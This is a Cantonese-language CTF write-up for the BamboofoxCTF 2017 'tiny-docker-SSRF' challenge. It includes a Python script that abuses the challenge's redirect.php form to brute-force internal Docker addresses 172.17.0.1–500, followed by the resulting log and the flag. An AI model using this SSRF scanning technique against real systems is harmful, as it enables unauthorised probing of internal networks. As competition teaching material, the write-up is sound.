---
title: BamboofoxCTF2017-tiny-docker-SSRF
date: 2018-01-01 18:01:02
tags:
---

## Question
http://bamboofox.cs.nctu.edu.tw:53323/

## Solution

### Hint1
```
There is a lot of server/docker in a company.

So you may need a little brute-force.

You will get the flag between 1 to 500
```

### Hint2
```
Mostly, container share a bridge...
```

呢2個hint想表達既似乎係有另一部裝住flag 既docker server係同題目係同一個subnet.
而係需要少少brute force既 , 咁應該係ip啦
如果係internal network既 , 咁應該係由172.17開頭
即刻寫條script brute brute佢先

``` python
import requests

output = ""
for i in range(1,501):
	try:
		r = requests.post("http://bamboofox.cs.nctu.edu.tw:53323/redirect.php",data={'url':'172.17.0.' + str(i)},timeout=0.5)
		if "Warning" not in r.text:
			print "[+] !!!! " + '172.17.0.' + str(i)
			output += "==============172.17.0." + str(i) + "====================="
			output += r.text
			output += "============================================================\r\n"
		else:
			print "[-] Fail : " + '172.17.0.' + str(i)
	except:
		print "[-]"

with open("C:/Users/admin/Desktop/out.log", "wb") as f:
	f.write(output.encode('ascii', 'ignore').decode('ascii'))
	f.close() 
```

最後係 172.17.0.80 搵到條flag

### out.log
```
==============172.17.0.79=====================<!DOCTYPE html>
<html>
    <head>
        <title>Docker-SSRF</title>
        <link rel="stylesheet" href="style.css">
    </head>
    <body>
        <div class="center">
            <form action="./redirect.php" method="post">
                <h2>
                    Redirect to: <input type="text" name="url">
                    <input type="submit">
                </h2>
            </form>
            <img src="https://res.cloudinary.com/blog-mornati-net/image/upload/v1472668207/sz9sfwiji9foh0cv1v5p.png" style="width: 60%;">
        </div>
    </body>
</html>
============================================================
==============172.17.0.80=====================<!DOCTYPE html>
<html>
    <head>
        <title>Flag</title>
<style>
.bk {
    background-color: aliceblue;
}
.block {
    margin: auto;
    width: 50%;
    padding: 20px;
    text-align: center;
    margin-top: 10%;
    border: solid 2px;
}
</style>
    </head>
    <body class="bk">
        <div class="block">
            <h2>BAMBOOFOX{5srF1n0ocK3r}</h2>
            <h3><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection">Server-Side Request Forgery!!</a></h3>
            <img src="https://d3eaqdewfg2crq.cloudfront.net/wp-content/uploads/2013/08/image2-1024x425.png" style="width: 100%;">
        </div>
    </body>
</html>
============================================================

```

## Flag
BAMBOOFOX{5srF1n0ocK3r}